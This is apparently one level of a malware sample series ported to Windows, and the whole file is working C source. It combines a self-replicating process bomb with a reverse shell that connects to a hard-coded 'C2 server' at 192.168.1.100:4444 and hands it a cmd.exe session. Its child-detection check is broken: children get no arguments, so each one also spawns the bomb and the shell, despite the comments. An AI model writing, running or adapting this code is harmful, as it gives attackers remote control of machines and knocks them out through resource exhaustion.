// Windows port of level11_ForkBombReverseShell
// Process bomb + reverse shell using CreateProcess

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

void process_bomb() {
    char self_path[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Get own executable path
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    // Infinite loop spawning child processes
    while(1) {
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Spawn copy of self (process bomb)
        CreateProcessA(
            self_path,
            NULL,
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            NULL,
            &si,
            &pi);

        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        Sleep(100);  // Small delay to avoid instant system crash
    }
}

void reverse_shell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Configure C2 server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    // Connect to C2 server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        // Setup process startup info to redirect I/O
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (HANDLE)sock;
        si.hStdOutput = (HANDLE)sock;
        si.hStdError = (HANDLE)sock;

        ZeroMemory(&pi, sizeof(pi));

        // Spawn cmd.exe shell with I/O redirected to socket
        if (CreateProcessA(
            "C:\\Windows\\System32\\cmd.exe",
            NULL,
            NULL,
            NULL,
            TRUE,  // Inherit handles
            0,
            NULL,
            NULL,
            &si,
            &pi)) {

            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(sock);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    HANDLE hThread;
    DWORD threadId;

    // Check if we're a child process (simplified detection)
    // In real scenario, would use command-line args or environment variables
    if (argc > 1) {
        // Child process - just exit immediately (bomb payload)
        return 0;
    }

    // Create thread for reverse shell
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)reverse_shell,
        NULL,
        0,
        &threadId);

    if (hThread) {
        // Give reverse shell time to connect
        Sleep(1000);
        CloseHandle(hThread);
    }

    // Main process - fork bomb behavior
    process_bomb();

    return 0;
}
